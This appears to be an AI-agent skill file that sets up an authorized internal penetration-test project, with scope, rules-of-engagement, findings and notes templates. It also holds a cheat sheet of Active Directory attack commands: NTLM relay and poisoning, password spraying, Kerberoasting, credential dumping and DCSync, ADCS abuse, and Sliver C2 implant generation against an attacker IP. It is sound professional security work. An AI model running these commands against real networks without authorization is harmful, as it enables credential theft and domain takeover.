# Initialize Internal Pentest Project

## Purpose
Bootstrap a complete internal penetration testing project structure in the current directory.

## When to Use
- Starting a new internal engagement
- User says "init project", "start internal pentest", "setup internal pentest"
- No VAULT.md exists in current directory

---

## Workflow

### Step 1: Gather Information

Use AskUserQuestion or conversational prompts:

1. **Client/Project name** (required)
2. **Access method** (required) - Physical (on-site) or VPN (remote)?
3. **Network ranges** (required) - CIDR blocks in scope (e.g., 10.0.0.0/8)
4. **Domain name** (if known) - e.g., corp.client.com
5. **Credentials provided?** (yes/no) - Assumed breach scenario?
6. **Username** (if credentials)
7. **Password** (if credentials)
8. **Testing type** - Black box / gray box / white box

### Step 2: Create Directory Structure

```bash
mkdir -p Findings Scripts outputs targets
```

```
[CLIENT_NAME]/
├── VAULT.md                 # Auto-loaded PAI context
├── Scope.md                 # Network ranges, credentials, ROE
├── Commands.md              # Full command reference (curated cheat sheet)
├── Notes.md                 # Running notes with phase checklist
├── Findings/
│   ├── README.md            # Finding index with status tracking
│   └── [finding-name].md    # Individual findings (kebab-case, Trace3 format)
├── Scripts/
│   ├── passive-sniffing.sh  # Phase 0: Passive credential capture & traffic analysis
│   ├── initial-discovery.sh # Phase 0: Situational awareness (zero-arg)
│   ├── network-discovery.sh # Phase 1: Network scanning
│   ├── ad-enum.sh           # Phase 2: AD enumeration
│   ├── credential-attacks.sh # Phase 3: Responder + spray setup
│   ├── bloodhound-collection.sh # BloodHound data collection
│   ├── deploy-remote.sh     # Deploy scripts to remote Kali via SCP
│   └── retrieve-results.sh  # Pull results back from remote Kali
├── targets/                 # Target lists
│   ├── ranges.txt           # CIDR blocks in scope
│   ├── live-hosts.txt       # Discovered live hosts
│   ├── domain-controllers.txt # Identified DCs
│   ├── windows-hosts.txt    # Windows systems
│   ├── linux-hosts.txt      # Linux systems
│   ├── services.txt         # Interesting services (SMB, MSSQL, etc.)
│   └── domain-users.txt     # Enumerated domain users
└── outputs/                 # Evidence with timestamps
    ├── nmap/                # Port scan results
    ├── bloodhound/          # BloodHound collections
    ├── responder/           # Captured hashes
    ├── passive-sniffing/    # Phase 0 passive captures (pcap, Flamingo, Responder -A)
    ├── netexec/             # NetExec output
    ├── certipy/             # ADCS enumeration
    ├── impacket/            # Impacket tool output
    ├── sliver/              # C2 session logs
    └── screenshots/         # Evidence screenshots
```

### Step 3: Create Files

#### VAULT.md (Minimal - project context only)

```markdown
# [CLIENT_NAME] Internal Penetration Test

**Client**: [CLIENT_NAME]
**Type**: Internal Penetration Test
**Access**: [Physical / VPN]
**Status**: In Progress
**Started**: [current_date]

## Quick Context
- Network Ranges: [CIDR blocks]
- Domain: [domain_name or "Discovery pending"]
- Test Account: [username or "None - black box"]
- Domain Controllers: [TBD]

## Key Files
- Scope: `Scope.md`
- Commands: `Commands.md`
- Findings: `Findings/README.md`
- Targets: `targets/`
- Evidence: `outputs/`

## Current Phase
- [ ] Phase 1: Network Discovery & Enumeration
- [ ] Phase 2: AD Enumeration & Attack Paths
- [ ] Phase 3: Credential Attacks & Initial Access
- [ ] Phase 4: Lateral Movement & Privilege Escalation
- [ ] Phase 5: Post-Exploitation & Reporting

## Related Skills
- `/internal-pentest` - Methodology and attack guidance
- `/OSINT` - Open source intelligence on target org
- `/azure-pentest` - If Azure/cloud components discovered
```

#### Scope.md

```markdown
# [CLIENT_NAME] - Internal Pentest Scope

## Access Method
- **Type**: [Physical on-site / VPN remote]
- **Connection**: [Network port location / VPN endpoint]
- **Testing Machine**: [Kali IP, hostname]
- **VLAN Assignment**: [VLAN ID if known]

## In-Scope Networks

### Network Ranges
| CIDR | Description | Notes |
|------|-------------|-------|
| [range_1] | [description] | Primary scope |

### Domains
| Domain | Type | Notes |
|--------|------|-------|
| [domain_name] | Active Directory | Primary domain |

## Test Credentials (if assumed breach)

**Primary Account**:
- Username: [DOMAIN\username]
- Password: [password]
- Account Type: [Standard user / Privileged]

**Additional Accounts**:
| Username | Password | Purpose |
|----------|----------|---------|
| | | |

## Exclusions

### Out-of-Scope Systems
| Host/Range | Reason |
|------------|--------|
| [critical_system] | Production - do not touch |

### Restricted Actions
- No denial of service
- No data exfiltration of real sensitive data
- No modification of production systems
- No destruction of logs or backups

## Rules of Engagement
- Testing Window: [dates/times]
- Authorization Contact: [name/email]
- Emergency Contact: [name/phone]
- Notification Required: [yes/no for critical findings]
- Data Handling: [destroy after report / retain X days]

## Network Notes
(Discovered network topology, VLAN mapping, etc.)
```

#### Commands.md (Full Command Reference)

```markdown
# [CLIENT_NAME] - Internal Pentest Command Reference

Quick reference organized by testing phase. All commands assume Kali Linux attack platform.

---

## Phase 1: Network Discovery

### Network Scanning
```bash
# Quick ping sweep
nmap -sn [CIDR] -oA outputs/nmap/pingsweep_$(date +%Y%m%d_%H%M%S)

# Fast port scan (top 1000)
nmap -sV -sC -iL targets/live-hosts.txt -oA outputs/nmap/service_scan

# Full port scan
nmap -sV -sC -p- -iL targets/live-hosts.txt -oA outputs/nmap/full_scan

# UDP scan (top 20)
nmap -sU --top-ports 20 -iL targets/live-hosts.txt -oA outputs/nmap/udp_scan

# Masscan (fast full port)
masscan -iL targets/ranges.txt -p1-65535 --rate 1000 -oL outputs/nmap/masscan_all.txt
```

### Service Enumeration
```bash
# SMB hosts (signing check)
netexec smb targets/live-hosts.txt --gen-relay-list targets/smb-no-signing.txt
netexec smb targets/live-hosts.txt

# MSSQL discovery
netexec mssql targets/live-hosts.txt

# WinRM discovery
netexec winrm targets/live-hosts.txt

# RDP discovery
netexec rdp targets/live-hosts.txt

# SNMP enumeration
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -i targets/live-hosts.txt

# Null session check
netexec smb targets/live-hosts.txt -u '' -p '' --shares
netexec smb targets/live-hosts.txt -u 'guest' -p '' --shares
```

---

## Phase 2: AD Enumeration

### Domain Discovery
```bash
# Find domain controllers
nmap -p 389,636,88,53 [CIDR] -oA outputs/nmap/dc_scan

# Identify domain from DNS
nslookup -type=SRV _ldap._tcp.dc._msdcs.[DOMAIN]

# LDAP anonymous bind
ldapsearch -x -H ldap://[DC_IP] -s base namingContexts
```

### BloodHound Collection
```bash
# SharpHound (from Windows)
# SharpHound.exe -c All --outputdirectory outputs/bloodhound/

# bloodhound-python (from Linux)
bloodhound-python -u '[USER]' -p '[PASS]' -d [DOMAIN] -ns [DC_IP] -c All --zip -o outputs/bloodhound/

# NetExec BloodHound
netexec ldap [DC_IP] -u '[USER]' -p '[PASS]' --bloodhound -ns [DC_IP] --collection All
```

### AD Enumeration
```bash
# Enumerate users
netexec ldap [DC_IP] -u '[USER]' -p '[PASS]' --users

# Enumerate groups
netexec ldap [DC_IP] -u '[USER]' -p '[PASS]' --groups

# Password policy
netexec smb [DC_IP] -u '[USER]' -p '[PASS]' --pass-pol

# Find domain admins
netexec ldap [DC_IP] -u '[USER]' -p '[PASS]' -M groupmembership -o GROUP="Domain Admins"

# Enumerate shares
netexec smb targets/live-hosts.txt -u '[USER]' -p '[PASS]' --shares

# Enumerate GPOs
netexec ldap [DC_IP] -u '[USER]' -p '[PASS]' -M get-gpo

# Find GPP passwords
netexec smb [DC_IP] -u '[USER]' -p '[PASS]' -M gpp_password

# Enumerate DNS
adidnsdump -u '[DOMAIN]\[USER]' -p '[PASS]' [DC_IP]
```

### ADCS Enumeration
```bash
# Find CA and templates
certipy find -u '[USER]@[DOMAIN]' -p '[PASS]' -dc-ip [DC_IP] -stdout

# Check for ESC vulnerabilities
certipy find -u '[USER]@[DOMAIN]' -p '[PASS]' -dc-ip [DC_IP] -vulnerable -stdout

# Output to file
certipy find -u '[USER]@[DOMAIN]' -p '[PASS]' -dc-ip [DC_IP] -vulnerable -json -output outputs/certipy/
```

---

## Phase 3: Credential Attacks

### LLMNR/NBT-NS Poisoning
```bash
# Start Responder
sudo responder -I [INTERFACE] -wrFP -v | tee outputs/responder/responder_$(date +%Y%m%d_%H%M%S).log

# View captured hashes
cat /usr/share/responder/logs/*.txt
```

### Relay Attacks
```bash
# SMB relay (requires SMB signing disabled)
sudo ntlmrelayx.py -tf targets/smb-no-signing.txt -smb2support -of outputs/impacket/relay_hashes

# With command execution
sudo ntlmrelayx.py -tf targets/smb-no-signing.txt -smb2support -c 'whoami /all'

# IPv6 DNS takeover + relay
sudo mitm6 -d [DOMAIN] --ignore-nofqdn
# In parallel:
sudo ntlmrelayx.py -6 -t ldaps://[DC_IP] --delegate-access -wh attacker-wpad

# ADCS relay (ESC8 - web enrollment)
sudo ntlmrelayx.py -t http://[CA_IP]/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### Password Attacks
```bash
# Password spray (careful of lockout)
netexec smb [DC_IP] -u targets/domain-users.txt -p '[PASSWORD]' --continue-on-success

# Multiple passwords (watch lockout policy!)
netexec smb [DC_IP] -u targets/domain-users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Kerberoasting
impacket-GetUserSPNs -request -dc-ip [DC_IP] '[DOMAIN]/[USER]:[PASS]' -outputfile outputs/impacket/kerberoast.txt

# AS-REP Roasting
impacket-GetNPUsers -dc-ip [DC_IP] '[DOMAIN]/' -usersfile targets/domain-users.txt -format hashcat -outputfile outputs/impacket/asrep.txt

# Crack with Hashcat
hashcat -m 13100 outputs/impacket/kerberoast.txt /usr/share/wordlists/rockyou.txt # Kerberoast
hashcat -m 18200 outputs/impacket/asrep.txt /usr/share/wordlists/rockyou.txt      # AS-REP
hashcat -m 5600 outputs/responder/*.txt /usr/share/wordlists/rockyou.txt           # NTLMv2
```

---

## Phase 4: Lateral Movement

### Remote Execution
```bash
# PSExec
impacket-psexec '[DOMAIN]/[USER]:[PASS]@[TARGET]'

# WMIExec
impacket-wmiexec '[DOMAIN]/[USER]:[PASS]@[TARGET]'

# SMBExec
impacket-smbexec '[DOMAIN]/[USER]:[PASS]@[TARGET]'

# Evil-WinRM
evil-winrm -i [TARGET] -u '[USER]' -p '[PASS]'

# NetExec command execution
netexec smb [TARGET] -u '[USER]' -p '[PASS]' -x 'whoami /all'
netexec winrm [TARGET] -u '[USER]' -p '[PASS]' -x 'whoami /all'

# Pass the Hash
impacket-psexec -hashes :[NTLM_HASH] '[DOMAIN]/[USER]@[TARGET]'
netexec smb [TARGET] -u '[USER]' -H [NTLM_HASH]
```

### Credential Dumping
```bash
# SAM dump (local admin required)
impacket-secretsdump '[DOMAIN]/[USER]:[PASS]@[TARGET]'

# LSASS dump via NetExec
netexec smb [TARGET] -u '[USER]' -p '[PASS]' -M nanodump
netexec smb [TARGET] -u '[USER]' -p '[PASS]' -M lsassy

# DCSync (Domain Admin required)
impacket-secretsdump -just-dc '[DOMAIN]/[USER]:[PASS]@[DC_IP]'
impacket-secretsdump -just-dc-ntlm '[DOMAIN]/[USER]:[PASS]@[DC_IP]'

# DPAPI
netexec smb [TARGET] -u '[USER]' -p '[PASS]' -M dpapi
```

### Privilege Escalation
```bash
# ADCS exploitation (ESC1)
certipy req -u '[USER]@[DOMAIN]' -p '[PASS]' -ca [CA_NAME] -template [TEMPLATE] -upn administrator@[DOMAIN] -dc-ip [DC_IP]
certipy auth -pfx administrator.pfx -dc-ip [DC_IP]

# Unconstrained delegation
# Find: BloodHound or
netexec ldap [DC_IP] -u '[USER]' -p '[PASS]' -M get-unixUserPassword

# Constrained delegation
impacket-getST -spn '[SPN]' -impersonate Administrator '[DOMAIN]/[USER]:[PASS]'

# Resource-based constrained delegation (RBCD)
impacket-rbcd -delegate-from '[MACHINE]$' -delegate-to '[TARGET]$' -action write '[DOMAIN]/[USER]:[PASS]'
impacket-getST -spn 'cifs/[TARGET]' -impersonate Administrator '[DOMAIN]/[MACHINE]$:[PASS]'

# Shadow Credentials
certipy shadow auto -u '[USER]@[DOMAIN]' -p '[PASS]' -account '[TARGET_USER]' -dc-ip [DC_IP]
```

---

## Phase 5: Sliver C2

### Setup
```bash
# Generate implant
sliver > generate --mtls [ATTACKER_IP] --os windows --arch amd64 --save outputs/sliver/

# Start listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Stager (smaller payload)
sliver > generate stager --lhost [ATTACKER_IP] --lport 8443 --protocol tcp --save outputs/sliver/
```

### Post-Exploitation
```bash
# In Sliver session:
sliver > getuid
sliver > getprivs
sliver > ps
sliver > netstat
sliver > ifconfig

# Credential access
sliver > hashdump
sliver > sa-enumerate

# Lateral movement
sliver > pivots tcp --bind 0.0.0.0:1234
```

---

## Utility Commands

### Hash Formats
```
NTLMv2: username::DOMAIN:challenge:response:blob  → hashcat -m 5600
NTLMv1: username::DOMAIN:lm:nt:challenge          → hashcat -m 5500
NetNTLMv2: (same as NTLMv2)                       → hashcat -m 5600
Kerberoast (RC4): $krb5tgs$23$*...                 → hashcat -m 13100
Kerberoast (AES): $krb5tgs$18$*...                 → hashcat -m 19700
AS-REP: $krb5asrep$23$...                          → hashcat -m 18200
NTLM: 32-char hex                                  → hashcat -m 1000
```

### File Transfer
```bash
# Python HTTP server
python3 -m http.server 8080

# PowerShell download
# IWR -Uri http://[IP]:8080/file -OutFile C:\temp\file

# Certutil
# certutil.exe -urlcache -split -f http://[IP]:8080/file C:\temp\file

# SMB share
impacket-smbserver share . -smb2support
```
```

#### Notes.md

```markdown
# [CLIENT_NAME] Internal Pentest Notes

**Target Network**: [CIDR ranges]
**Domain**: [domain_name]
**Access**: [Physical / VPN]
**Credentials**: [username or "None"]
**Start Date**: [current_date]

---

## Testing Phases

### Phase 0: Initial Discovery & Passive Intel (Day 1)
- [ ] Start passive sniffing: `sudo ./passive-sniffing.sh` (Responder -A, tcpdump, Flamingo)
- [ ] Run initial-discovery.sh (IP, gateway, DNS, DCs)
- [ ] Verify network connectivity
- [ ] Identify domain name and forest
- [ ] Confirm scope CIDR ranges with client
- [ ] Document access method (physical port / VPN / WiFi)
- [ ] Review passive captures for credentials/traffic patterns

### Phase 1: Network Discovery & Enumeration (Days 1-2)
- [ ] Ping sweep / host discovery
- [ ] Port scanning (top 1000 + full)
- [ ] Service version identification
- [ ] SMB enumeration (shares, signing)
- [ ] VLAN/network segmentation mapping
- [ ] SNMP enumeration
- [ ] Null session checks

### Phase 2: AD Enumeration & Attack Paths (Days 2-4)
- [ ] Domain controller identification
- [ ] BloodHound collection
- [ ] User/group enumeration
- [ ] Password policy review
- [ ] ADCS enumeration (Certipy)
- [ ] Trust relationship mapping
- [ ] GPO analysis
- [ ] Share enumeration (sensitive files)
- [ ] DNS enumeration

### Phase 3: Credential Attacks & Initial Access (Days 4-6)
- [ ] LLMNR/NBT-NS poisoning (Responder)
- [ ] SMB relay attacks (ntlmrelayx)
- [ ] IPv6 DNS takeover (mitm6)
- [ ] Password spraying
- [ ] Kerberoasting
- [ ] AS-REP Roasting
- [ ] Hash cracking (Hashcat)

### Phase 4: Lateral Movement & Privilege Escalation (Days 6-8)
- [ ] Lateral movement with captured creds
- [ ] Credential dumping (secretsdump, lsassy)
- [ ] ADCS exploitation (if vulnerable)
- [ ] Delegation attacks
- [ ] Token impersonation
- [ ] DCSync (if DA achieved)
- [ ] Sliver C2 deployment (if authorized)

### Phase 5: Post-Exploitation & Reporting (Days 8-10)
- [ ] Evidence organization
- [ ] Finding documentation (Trace3)
- [ ] Executive summary
- [ ] Remediation roadmap
- [ ] Attack path diagram

---

## Session Log

### [current_date] - Initial Setup

- Project initialized
- Ready to begin network discovery

---

## Quick Notes

(Stream of consciousness notes go here during testing)

---

## Compromised Accounts

| Username | Source | Hash/Password | Admin On |
|----------|--------|---------------|----------|
| | | | |

---

## Attack Path

(Document the chain: initial access → lateral movement → domain compromise)

1. [Step 1]
2. [Step 2]

---

## Follow-Up Items

(Things to circle back to)
```

#### Findings/README.md

```markdown
# [CLIENT_NAME] - Security Findings

**Target**: [network_ranges] / [domain_name]
**Assessment Period**: [dates]
**Last Updated**: [current_date]

---

## Finding Summary

| Severity | Count | Status |
|----------|-------|--------|
| Critical | 0 | - |
| High | 0 | - |
| Medium | 0 | - |
| Low | 0 | - |
| Informational | 0 | - |

---

## Findings Index

### Critical Severity
| Finding | File | Evidence | Status |
|---------|------|----------|--------|
| *None yet* | - | - | PENDING |

### High Severity
| Finding | File | Evidence | Status |
|---------|------|----------|--------|
| *None yet* | - | - | PENDING |

### Medium Severity
| Finding | File | Evidence | Status |
|---------|------|----------|--------|
| *None yet* | - | - | PENDING |

### Low/Informational
| Finding | File | Evidence | Status |
|---------|------|----------|--------|
| *None yet* | - | - | PENDING |

---

## Validation Matrix

| Finding | Nmap | NetExec | BloodHound | Responder | Manual | Confidence |
|---------|------|---------|------------|-----------|--------|------------|
| *None yet* | - | - | - | - | - | - |

---

## Attack Path Summary

```
[Initial Access Method]
    → [Lateral Movement Step]
        → [Privilege Escalation]
            → [Domain Compromise]
```

---

## Evidence Locations

| Directory | Contents |
|-----------|----------|
| `outputs/nmap/` | Port and service scans |
| `outputs/bloodhound/` | BloodHound collections |
| `outputs/responder/` | Captured NTLMv2 hashes |
| `outputs/netexec/` | NetExec enumeration output |
| `outputs/certipy/` | ADCS enumeration results |
| `outputs/impacket/` | Kerberoast, secretsdump output |
| `outputs/sliver/` | C2 session logs and implants |
| `outputs/screenshots/` | Evidence screenshots |
```

### Step 4: Copy Scripts

Copy the automation scripts from the skill's Scripts/ directory into the project:

```bash
cp /Users/j_1/.claude/skills/_INTERNAL_PENTEST/Scripts/*.sh Scripts/
chmod +x Scripts/*.sh
```

### Step 5: Populate Target Files

```bash
# Write known ranges
echo "[CIDR_RANGE]" > targets/ranges.txt

# Create empty target files
touch targets/live-hosts.txt
touch targets/domain-controllers.txt
touch targets/windows-hosts.txt
touch targets/linux-hosts.txt
touch targets/services.txt
touch targets/domain-users.txt
```

### Step 6: Post-Initialization Message

After creating files:

```
Created internal pentest structure for "[CLIENT_NAME]":

✓ VAULT.md with project context
✓ Scope.md for network ranges and credentials
✓ Commands.md with full tool reference
✓ Notes.md with 5-phase checklist
✓ Findings/README.md with validation matrix
✓ Scripts/ with automation (initial-discovery, network-discovery, ad-enum, credential-attacks, bloodhound)
✓ targets/ for scope management
✓ outputs/ for evidence collection

**Next Steps**:
1. Review Scope.md and confirm exclusions
2. Run Phase 0 initial discovery: `cd Scripts && chmod +x *.sh && ./initial-discovery.sh`
3. Review discovered CIDR, then run Phase 1: `./network-discovery.sh [discovered CIDR]`
4. After hosts discovered, proceed to AD enumeration

**Remote Kali?** If testing from a remote Kali box:
`cd Scripts && ./deploy-remote.sh user@kali-ip`
See `Workflows/RemoteDeploy.md` for the full remote workflow.

**Available Skills**:
- `/internal-pentest` - Return here for methodology guidance
- `/OSINT` - Company and employee intelligence
- `/Recon` - Technical reconnaissance

Ready to start!
```
